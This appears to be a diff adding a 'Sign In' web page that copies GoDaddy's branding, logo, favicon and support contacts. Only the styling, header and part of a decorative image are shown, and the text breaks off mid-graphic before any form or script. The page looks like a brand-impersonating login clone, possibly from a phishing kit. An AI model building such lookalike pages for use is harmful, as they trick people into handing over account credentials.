@@ -1,0 +1,1436 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Sign In</title>
+
+    <link rel="shortcut icon" href="https://img6.wsimg.com/ux/favicon/apple-icon-57x57.png" type="image/x-icon">
+
+    <style>
+
+    :root {
+
+        --ux-1067ph9: "gdsherpa",Helvetica,Arial,sans-serif;
+
+    }
+
+    html {
+
+        font-family: sans-serif;
+
+    }
+
+    body {
+
+        font-family: var(--ux-1067ph9,sans-serif);
+
+        background-color: #f5f7f8;
+
+        padding: 0;
+
+        margin: 0;
+
+        color: #111;
+
+        height: 100%;
+
+    }
+
+    *::selection { background-color: #bbf7f7; }
+
+    .content {
+
+        flex: 1 0 auto;
+
+    }
+
+    .w-full {
+
+        width: 100% !important;
+
+    }
+
+    .h-full {
+
+        height: 100%;
+
+    }
+
+    .text-center {
+
+        text-align: center;
+
+    }
+
+    .flex {
+
+        display: flex;
+
+    }
+
+    .flex-col {
+
+        display: flex;
+
+        flex-direction: column;
+
+    }
+
+    .items-start {
+
+        align-items: flex-start;
+
+    }
+
+    .items-center {
+
+        align-items: center;
+
+    }
+
+    .items-end {
+
+        align-items: flex-end;
+
+    }
+
+    .justify-start {
+
+        justify-content: flex-start;
+
+    }
+
+    .justify-center {
+
+        justify-content: center;
+
+    }
+
+    .justify-end {
+
+        justify-content: flex-start;
+
+    }
+
+    .justify-between {
+
+        justify-content: space-between;
+
+    }
+
+    .hidden {
+
+        display: none !important;
+
+    }
+
+    .relative {
+
+        position: relative;
+
+    }
+
+    .absolute {
+
+        position: absolute;
+
+    }
+
+    .mb-0 {
+
+        margin-bottom: 0 !important;
+
+    }
+
+    .mt-0 {
+
+        margin-top: 0 !important;
+
+    }
+
+    .ml-0 {
+
+        margin-left: 0 !important;
+
+    }
+
+    .mr-0 {
+
+        margin-right: 0 !important;
+
+    }
+
+    a.link {
+
+        font-weight: 500;
+
+        font-size: 1rem;
+
+        color: #09757a !important;
+
+    }
+
+    a.link:hover {
+
+        font-weight: 500;
+
+        font-size: 1rem;
+
+        color: #00a4a6 !important;
+
+    }
+
+    .btn {
+
+        padding: 0.5rem 1rem;
+
+        cursor: pointer;
+
+        font-weight: 600;
+
+        line-height: 1.5;
+
+        display: block;
+
+        width: fit-content;
+
+        text-align: center;
+
+    }
+
+    .btn-outline-dark {
+
+        border: 2px solid #111;
+
+        text-decoration: none;
+
+        color: #111;
+
+    }
+
+    .btn-dark-fill {
+
+        border-radius: 0;
+
+        border: 2px solid #111;
+
+        background-color: #111;
+
+        color: #fff;
+
+        display: block;
+
+        height: 40px;
+
+        font-size: 1rem;
+
+    }
+
+    .underline {
+
+        text-decoration: underline;
+
+    }
+
+
+
+    .header {
+
+        padding: 9px 10px;
+
+        background-color: #fff;
+
+    }
+
+    .header .logo {
+
+        display: block;
+
+    }
+
+    .header .logo svg {
+
+        height: 2.125rem;
+
+        width: 10.375rem;
+
+    }
+
+    .header .mobile-logo {
+
+        display: none;
+
+    }
+
+    .header .mobile-logo svg {
+
+        height: 2rem;
+
+        width: 2.25rem;
+
+    }
+
+    .header-container {
+
+        height: 3rem;
+
+        padding-left: 3.375rem;
+
+        padding-right: 3.375rem;
+
+    }
+
+    .chevron-down svg {
+
+        color: #111;
+
+        display: inline-block;
+
+    }
+
+    .header .right a {
+
+        color: #111;
+
+        text-decoration: none;
+
+    }
+
+    .header .right .desktop {
+
+        display: flex;
+
+    }
+
+    .header .right .mobile {
+
+        display: none;
+
+    }
+
+
+
+    .header .right .contact-menus {
+
+        position: absolute;
+
+        z-index: 200;
+
+        padding: 2.5rem 0;
+
+        top: 100%;
+
+        left: 0;
+
+        width: 100%;
+
+        background-color: #f5f7f8;
+
+        transform: scaleY(0);
+
+        transform-origin: top;
+
+        height: auto;
+
+        box-shadow: 0 0.5rem 0.25rem -0.375rem rgb(117 117 117 / 20%);
+
+        transition: all .3s cubic-bezier(.65,-.01,.26,1);
+
+        visibility: hidden;
+
+    }
+
+    .contact-menus.open {
+
+        transform: scaleY(1) !important;
+
+        visibility: visible !important;
+
+    }
+
+    .contact-menu-wrapper {
+
+        max-width: 940px;
+
+        margin: auto;
+
+    }
+
+    .contact-menu-column {
+
+        width: 33.33%;
+
+        border-right: 1px solid #767676;
+
+    }
+
+    .contact-menu-column h3 {
+
+        font-size: 1.8rem;
+
+        line-height: 2.25rem;
+
+        font-weight: 500;
+
+    }
+
+    .contact-menu-open.open .chevron-down {
+
+        transform: rotate(180deg);
+
+    }
+
+    .contact-menu-column .call-center {
+
+        margin-bottom: 3rem;
+
+    }
+
+
+
+    @media screen and (max-width: 768px) {
+
+        .header .right .desktop {
+
+            display: none;
+
+        }
+
+        .header .right .mobile {
+
+            display: block;
+
+        }
+
+        .header .logo {
+
+            display: none;
+
+        }
+
+        .header .mobile-logo {
+
+            display: block;
+
+        }
+
+        .header {
+
+            padding: 9px 10px;
+
+            background-color: #fff;
+
+        }
+
+        .header-container {
+
+            height: 3rem;
+
+            padding-left: 0;
+
+            padding-right: 0;
+
+        }
+
+        .contact-menu-wrapper {
+
+            padding-left: 8px;
+
+            padding-right: 8px;
+
+        }
+
+        .contact-menu-column {
+
+            width: 100%;
+
+            border-right: none;
+
+        }
+
+        .contact-menu-column h3 {
+
+            font-size: 1.6rem;
+
+            line-height: 2.25rem;
+
+            font-weight: 500;
+
+            margin-top: 0;
+
+            margin-bottom: 0.5rem;
+
+        }
+
+        .contact-menu-column .help-center {
+
+            display: block !important;
+
+        }
+
+        .contact-menu-column .help-center p {
+
+            line-height: 1.5;
+
+            margin: 0 0 1.5rem 0;
+
+        }
+
+    }
+
+    .main .left {
+
+        width: 50%;
+
+    }
+
+    .main .right {
+
+        width: 50%;
+
+    }
+
+
+
+    .container {
+
+        margin: 0 auto;
+
+    }
+
+    .panel-body {
+
+        padding: 10px 20px 30px 20px;
+
+    }
+
+    .panel-bottom {
+
+        margin-top: 10px;
+
+        padding: 0 20px;
+
+    }
+
+
+
+    @media screen and (min-width: 992px) {
+
+        .container {
+
+            width: 980px;
+
+        }
+
+        .panel-wrapper {
+
+            width: 460px;
+
+            margin-top: 40px;
+
+        }
+
+        .panel-body {
+
+            padding: 10px 20px 30px 20px;
+
+        }
+
+        .panel-bottom {
+
+            margin-top: 10px;
+
+            padding: 0 20px;
+
+        }
+
+    }
+
+    @media screen and (min-width: 1200px) {
+
+        .container {
+
+            width: 1150px;
+
+        }
+
+        .panel-wrapper {
+
+            width: 565px;
+
+            margin-top: 40px;
+
+        }
+
+        .panel-body {
+
+            padding: 25px 100px 35px 100px;
+
+        }
+
+        .panel-bottom {
+
+            margin-top: 10px;
+
+            padding: 0 100px;
+
+        }
+
+    }
+
+
+
+    .login-panel {
+
+        background-color: #fff;
+
+        border: 1px solid #d4dbe0;
+
+        border-radius: 4px;
+
+    }
+
+    .panel-header {
+
+        background-color: #333;
+
+        color: #fff;
+
+        padding: 0.225rem 0;
+
+    }
+
+    .panel-header h2 {
+
+        font-size: 2rem;
+
+        line-height: 2.5rem;
+
+    }
+
+    .panel-body h2 {
+
+        font-size: 2rem;
+
+        line-height: 2.5rem;
+
+        margin-bottom: 1rem;
+
+        margin-top: 2.5rem;
+
+    }
+
+
+
+    .form-group {
+
+        margin-bottom: 1.5rem;
+
+    }
+
+    .input-group {
+
+        position: relative;
+
+        width: auto;
+
+        display: flex;
+
+        border: solid 1px #AAB7C2;
+
+        border-radius: 0.0625rem;
+
+        box-sizing: border-box;
+
+    }
+
+    .input-group input {
+
+        border: none;
+
+        outline: 0;
+
+        width: 100%;
+
+        font-size: 1rem;
+
+        color: #111111;
+
+        border: 0;
+
+        padding: 1.25rem 0.75rem 0.3125rem 0.75rem;
+
+        line-height: 1.5;
+
+    }
+
+    .input-group label {
+
+        font-weight: 500;
+
+        color: #111111;
+
+        font-size: 0.95rem;
+
+        position: absolute;
+
+        transition: all .1s ease-in-out;
+
+        padding-left: 0.75rem;
+
+        transform-origin: top left;
+
+        transform: translate(0, 0.75rem) scale(1);
+
+        margin-bottom: 0;
+
+        line-height: 1.5;
+
+    }
+
+    .input-group.required label::after {
+
+        content: '*';
+
+        color: #ff0000;
+
+        margin-left: 3px;
+
+    }
+
+    .input-group.focused label {
+
+        padding-left: 0.875rem;
+
+        transform: translate(0, 3px) scale(.75);
+
+        color: #767676;
+
+    }
+
+    #toggle-password-showing {
+
+        position: absolute;
+
+        right: 5px;
+
+        transform: translate(0, 80%);
+
+        border: none;
+
+        outline: 0;
+
+        background-color: #fff;
+
+        cursor: pointer;
+
+        color: #09757a;
+
+        font-size: 0.95rem;
+
+        font-weight: 500;
+
+    }
+
+    .check-box-wrapper {
+
+        position: relative;
+
+        margin-right: 8px;
+
+    }
+
+    .check-box-wrapper input {
+
+        position: absolute;
+
+        top: 0;
+
+        left: 0;
+
+        opacity: 0;
+
+        cursor: inherit;
+
+        height: 1.25em;
+
+        width: 1.25em;
+
+        cursor: pointer;
+
+    }
+
+    .uxicon-svg-container.ux-control-indicator {
+
+        cursor: pointer;
+
+        border: 1px solid #d3d3d3;
+
+        background-color: #fff;
+
+        font-size: 87.5%;
+
+        height: calc(1.5em - 3px);
+
+        width: calc(1.5em - 3px);
+
+    }
+
+    .uxicon-svg-container.ux-control-indicator use {
+
+        fill: transparent;
+
+    }
+
+    .check-box-wrapper.checked .uxicon-svg-container.ux-control-indicator {
+
+        border: 1px solid #00a4a6;
+
+        background-color: #00a4a6;
+
+    }
+
+    .check-box-wrapper.checked .uxicon-svg-container.ux-control-indicator use {
+
+        fill: #fff;
+
+    }
+
+    .panel-bottom p {
+
+        color: #444;
+
+        font-size: 16px;
+
+        text-align: center;
+
+        margin-bottom: 15px;
+
+        font-weight: bolder;
+
+    }
+
+    .panel-bottom .btn {
+
+        width: 100% !important;
+
+        display: block;
+
+        padding: .25rem 0;
+
+        font-size: 0.835rem;
+
+        font-weight: 600;
+
+    }
+
+    .panel-bottom .btn:hover {
+
+        color: #00a4a6;
+
+    }
+
+
+
+    .footer {
+
+        background-color: #fff;
+
+        flex-shrink: 0;
+
+        min-height: 44px;
+
+        line-height: 44px;
+
+        position: fixed;
+
+        bottom: 0;
+
+        width: 100%;
+
+    }
+
+    .footer-wrapper {
+
+        padding: 10px 0;
+
+        margin-top: 20px;
+
+    }
+
+    .footer-content {
+
+        text-align: center;
+
+        font-size: .875em;
+
+    }
+
+    #error-block {
+
+        background-color: #ffbbbb;
+
+        font-size: 0.95rem;
+
+        padding: 1rem;
+
+        border-radius: 2px;
+
+    }
+
+    .error-content {
+
+        margin-left: 10px;
+
+        line-height: 1.5;
+
+    }
+
+    .error-content a {
+
+        color: #111;
+
+    }
+
+
+
+    #pass-bg {
+
+        position: absolute;
+
+        top: 20%;
+
+        width: 50%;
+
+        z-index: 100;
+
+    }
+
+    @media screen and (max-width: 768px) {
+
+        #pass-bg {
+
+            display: none;
+
+        }
+
+        .main .left {
+
+            display: none;
+
+        }
+
+        .main .right {
+
+            width: 100%;
+
+        }
+
+        .panel-wrapper {
+
+            width: 100%;
+
+            margin-top: 0;
+
+        }
+
+        .login-panel {
+
+            border: none;
+
+        }
+
+        .footer {
+
+            line-height: 1.5rem;
+
+        }
+
+    }
+
+    .svg-fill-primary-o {
+
+        fill: #00a4a6;
+
+    }
+
+    .svg-stroke-white {
+
+        stroke: #fff;
+
+    }
+
+    .svg-fill-none {
+
+        fill: none !important;
+
+    }
+
+    .svg-stroke-gray-dark {
+
+        stroke: #2b2b2b !important;
+
+    }
+
+    .svg-stroke-gray-light {
+
+        stroke: #aab7c2 !important;
+
+    }
+
+    .svg-fill-gray-light {
+
+        fill: #aab7c2 !important;
+
+    }
+
+    .svg-fill-white {
+
+        fill: #fff;
+
+    }
+
+    </style>
+
+</head>
+
+<body class="flex-col">
+
+    <div class="content">
+
+        <div class="header relative">
+
+            <div class="flex justify-between items-center header-container">
+
+                <div class="left">
+
+                    <a href="/" class="logo">
+
+                        <svg viewBox="0 0 166 34" xmlns="http://www.w3.org/2000/svg"><path d="M32.937 1.554c-3.968-2.48-9.193-1.889-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.434 20.434 0 01-2.46-5.632 16.104 16.104 0 01-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.09 24.09 0 00-4.228 5.081C8.697 15.086 7.71 20.848 8.84 25.443a20.911 20.911 0 01-2.408-3.151zm27.786-5.634a20.482 20.482 0 01-2.46 5.632 21.1 21.1 0 01-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.625.625 0 00-.895-.243l-7.72 4.823a.631.631 0 00-.2.87l1.133 1.811a.63.63 0 00.869.2l5.004-3.126c.162.486.324.971.445 1.457a16.1 16.1 0 01.536 5.303c-.238 3.151-1.521 5.606-3.612 6.914a7.06 7.06 0 01-3.579 1.036h-.16a7.051 7.051 0 01-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 01.534-5.31 21.015 21.015 0 016.444-10.314 16.137 16.137 0 014.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.761 3.613 6.914a16.145 16.145 0 01-.528 5.311zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.121 7.34 7.121 4.086 0 7.366-3.112 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385zM90.583 7.362h-7.468a.6.6 0 00-.61.612v18.208a.605.605 0 00.61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.633.633 0 00-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.751-6.783 7.145 0 4.37 3.251 7.171 6.755 7.171 1.806 0 3.28-.777 3.92-1.834v.861a.587.587 0 00.582.585h2.808a.571.571 0 00.584-.585V13.896a.594.594 0 00-.592-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412zm22.294-16.118h-2.808a.592.592 0 00-.61.584v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.751-6.7 7.145 0 4.37 3.252 7.171 6.755 7.171 1.806 0 3.17-.777 3.92-1.834v.861c0 .322.261.583.583.585h2.808a.57.57 0 00.584-.585V7.95a.57.57 0 00-.584-.588zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.594.594 0 00-.612.584v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.751-6.7 7.145 0 4.37 3.253 7.171 6.755 7.171 1.807 0 3.168-.777 3.92-1.834v.861a.587.587 0 00.584.585h2.803a.568.568 0 00.582-.585V7.95a.568.568 0 00-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448zm21.906-9.283l-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 01.554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.249-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 01-.635.634h-2.317a.623.623 0 01-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.843.843 0 01.07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 01-.511.009.783.783 0 01-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 01-.634-.635v-2.086a.625.625 0 01.634-.634h7.161a.604.604 0 01.635.607zm96.882-8.063v-.186c0-.013.005-.026.013-.036a.052.052 0 01.034-.013h1.183c.013 0 .025.005.034.013.009.01.013.023.013.036v.186a.052.052 0 01-.013.034.047.047 0 01-.034.013h-.432v1.167a.05.05 0 01-.048.048h-.224a.044.044 0 01-.032-.014.047.047 0 01-.015-.034v-1.167h-.432a.044.044 0 01-.047-.047zm2.069-.193l.323.75.324-.75a.066.066 0 01.026-.032.087.087 0 01.044-.01h.375a.044.044 0 01.047.046v1.404a.044.044 0 01-.045.047h-.21a.047.047 0 01-.035-.013.042.042 0 01-.013-.034v-1.06l-.348.77a.084.084 0 01-.026.038.08.08 0 01-.043.01h-.172a.078.078 0 01-.042-.01.073.073 0 01-.026-.037l-.346-.77v1.06a.052.052 0 01-.013.033.052.052 0 01-.032.013h-.216a.042.042 0 01-.03-.013.042.042 0 01-.013-.034v-1.404a.044.044 0 01.047-.046h.364c.014 0 .029.003.042.01.009.009.015.02.018.032z"></path></svg>
+
+                    </a>
+
+                    <a href="/" class="mobile-logo">
+
+                        <svg viewBox="0 0 36 32" xmlns="http://www.w3.org/2000/svg"><path d="M30.824 1.453c-3.713-2.316-8.603-1.77-12.963.972-4.347-2.74-9.239-3.288-12.948-.972C-.955 5.12-1.667 14.564 3.32 22.546c3.677 5.887 9.428 9.335 14.548 9.271 5.119.064 10.87-3.384 14.547-9.27C37.4 14.563 36.692 5.12 30.824 1.452zM6.02 20.863a19.112 19.112 0 01-2.303-5.273 15.067 15.067 0 01-.5-4.97C3.44 7.673 4.64 5.375 6.598 4.15c1.957-1.224 4.544-1.295 7.299-.203.419.169.829.358 1.228.568a22.496 22.496 0 00-3.956 4.754C8.14 14.116 7.215 19.511 8.272 23.81a19.723 19.723 0 01-2.253-2.947zm26.003-5.273a19.158 19.158 0 01-2.302 5.272 19.733 19.733 0 01-2.254 2.954c.946-3.855.303-8.576-2.014-13.005a.583.583 0 00-.837-.228l-7.225 4.515a.59.59 0 00-.188.813l1.06 1.695a.59.59 0 00.814.188l4.683-2.925c.151.454.303.901.416 1.363.442 1.617.611 3.297.5 4.97-.223 2.95-1.424 5.247-3.38 6.471a6.607 6.607 0 01-3.35.97h-.15a6.599 6.599 0 01-3.35-.97c-1.958-1.224-3.159-3.521-3.381-6.472-.11-1.672.058-3.352.5-4.969a19.671 19.671 0 016.03-9.65 15.108 15.108 0 014.241-2.629c2.748-1.092 5.34-1.02 7.298.203 1.958 1.224 3.157 3.522 3.38 6.47a15.105 15.105 0 01-.49 4.964zM27.89 30.386v-.21c0-.015.005-.03.015-.04a.048.048 0 01.038-.015h1.342c.014-.001.028.004.038.015.01.01.016.025.015.04v.21a.051.051 0 01-.015.04.048.048 0 01-.038.014h-.49v1.322a.05.05 0 01-.017.04.051.051 0 01-.038.017h-.253a.055.055 0 01-.038-.017.06.06 0 01-.015-.04V30.44h-.49a.048.048 0 01-.039-.015.051.051 0 01-.015-.04zm2.345-.217l.374.848.375-.848a.073.073 0 01.03-.036.08.08 0 01.05-.012h.4a.051.051 0 01.053.053v1.592a.056.056 0 01-.013.037.05.05 0 01-.037.016h-.24a.055.055 0 01-.038-.016.056.056 0 01-.015-.037v-1.203l-.393.874a.09.09 0 01-.03.04.086.086 0 01-.05.013h-.194a.085.085 0 01-.048-.012.09.09 0 01-.03-.041l-.393-.874v1.203a.05.05 0 01-.015.037.053.053 0 01-.036.016h-.243a.05.05 0 01-.036-.016.056.056 0 01-.015-.037v-1.592a.05.05 0 01.017-.038.047.047 0 01.036-.015h.413a.083.083 0 01.049.012.071.071 0 01.029.036z"></path></svg>
+
+                    </a>
+
+                </div>
+
+                <div class="right">
+
+                    <a href="javascript:void(0);" class="desktop flex items-center justify-center contact-menu-open">
+
+                        <span>Contact Us 24/7</span>
+
+                        <span class="chevron-down flex items-center justify-center">
+
+                            <svg class="uxicon-svg-container" height="20" width="20" role="img"><use fill="currentColor" xlink:href="#svg-container-chevron-down"></use></svg>
+
+                        </span>
+
+                    </a>
+
+                    <a href="javascript:void(0);" class="mobile contact-menu-open">
+
+                        <svg class="uxicon-svg-container" height="1.5em" width="1.5em" role="img"><use fill="currentColor" xlink:href="#svg-container-phone"></use></svg>
+
+                    </a>
+
+    
+
+                    <div class="contact-menus" id="contact-menus">
+
+                        <div class="contact-menu-wrapper relative">
+
+                            <div class="contact-menu-column">
+
+                                <div class="call-center">
+
+                                    <h3>Call us</h3>
+
+                                    <div class="contact-menu">
+
+                                        <p>Call our award-winning sales & support team 24/7</p>
+
+                                        <a href="tel:14803663547" class="link">1-480-366-3547</a>
+
+                                    </div>
+
+                                    <div class="contact-menu">
+
+                                        <p>Global Directory</p>
+
+                                        <a href="https://www.godaddy.com/contact-us" class="link">Phone numbers and hours</a>
+
+                                    </div>
+
+                                </div>
+
+    
+
+                                <div class="help-center hidden">
+
+                                    <h3>Help Center</h3>
+
+                                    <p>Explore our online help resources</p>
+
+                                    <a href="https://www.godaddy.com/help" class="btn btn-outline-dark">Get Help</a>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    
+
+        <div id="pass-bg">
+
+            <svg viewBox="0 0 677 395"><g id="a274fe"><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M2 243.66h196.88M216.22 243.94l458.71-.04" class="svg-fill-none svg-stroke-gray-dark"></path><rect x="523.08" y="269.84" width="84.33" height="20.88" rx="2" ry="2" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></rect><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M598.4 279.68h-66.67" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M593.33 215.84v44.84h-56.17V179.3h56.17v17.88" class="svg-fill-primary-o svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M546.16 236.83l13.95-13.94M548 251.17l13.94-13.94" class="svg-fill-none svg-stroke-white"></path><path d="M593.33 179.3v-13.62a2 2 0 0 0-2-2h-52.17a2 2 0 0 0-2 2v13.62zM537.16 260.68v17a2 2 0 0 0 2 2h52.17a2 2 0 0 0 2-2v-17z" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M553.99 171.3h21.75" class="svg-fill-none svg-stroke-gray-light"></path><circle cx="564.87" cy="270.3" r="3.75" class="svg-fill-gray-light"></circle><path d="M309.65 325.29h170.9a8.47 8.47 0 0 1 8.44 8.44v42.9a8.47 8.47 0 0 1-8.44 8.44H267.4a8.47 8.47 0 0 1-8.44-8.44v-42.9a8.47 8.47 0 0 1 8.44-8.44h27.22" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><rect x="269.31" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="289" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="308.69" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="328.39" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="348.08" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="367.78" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="387.47" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="407.17" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="426.86" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="446.55" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="466.25" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="279.39" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="299.08" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="318.78" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="338.47" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="358.16" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="377.86" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="397.55" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="417.25" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="436.94" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="456.64" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="269.31" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="289" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><path d="M436.71 363.97h-125.2a2.82 2.82 0 0 0-2.81 2.82v5.62a2.82 2.82 0 0 0 2.81 2.82h125.2a2.82 2.82 0 0 0 2.81-2.82v-5.62a2.82 2.82 0 0 0-2.81-2.82z" class="svg-fill-gray-light"></path><rect x="446.55" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="466.25" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><path d="M194.07 392.35a22.06 22.06 0 0 1-22-22v-26a21.83 21.83 0 0 1 2.6-10.36 22.13 22.13 0 0 1 19.4-11.64 22.06 22.06 0 0 1 22 22v26a22.06 22.06 0 0 1-22 22z" class="svg-fill-white"></path><path d="M209.6 328.81a21.89 21.89 0 0 0-15.53-6.46 22.06 22.06 0 0 0-22 22v26a22.06 22.06 0 0 0 22 22 22.06 22.06 0 0 0 22-22v-26a21.78 21.78 0 0 0-.83-6" stroke-linecap="round" stroke-miterlimit="10" stroke-width="3.838" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M188.46 353.84h-16M189.65 359.84h-17.19M191.2 365.84h-18.74M193.45 371.84h-20.83M196.27 377.84h-22.31M200.15 383.84h-23.38" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M172.46 345.1h43.1M194.06 323.18v21.92" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M212.45 43.4a39.75 39.75 0 1 1-68 41.17" fill="#fee782"></path><path d="M170.4 83.39a19.18 19.18 0 0 1-6.88-6.73M196.5 56.68a19.28 19.28 0 0 1-12.24 28.8M105.44 241.9L67.16 133.96M66.04 128.98L111.4 11.43h24" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-none svg-stroke-gray-dark"></path><circle cx="66.32" cy="128.93" r="11" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></circle><path d="M136.4 29.8a18.32 18.32 0 1 1 31.33-19z" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M219.4 42.82l-88.43 53.53a55.95 55.95 0 0 1 88.9-67" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M58.4 272.29v10.07c0 5.44 20.63 9.84 46.08 9.84s46.08-4.4 46.08-9.84v-10.07z" stroke-miterlimit="10" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M141.03 265.36c6 1.66 9.55 3.74 9.55 6 0 5.44-20.63 9.84-46.08 9.84s-46.1-4.41-46.1-9.85 20.63-9.84 46.08-9.84a184.56 184.56 0 0 1 25.37 1.67" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path d="M92.98 268.35v-22.82a5.77 5.77 0 0 1 5.76-5.76h11.52a5.77 5.77 0 0 1 5.76 5.76v22.82" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" 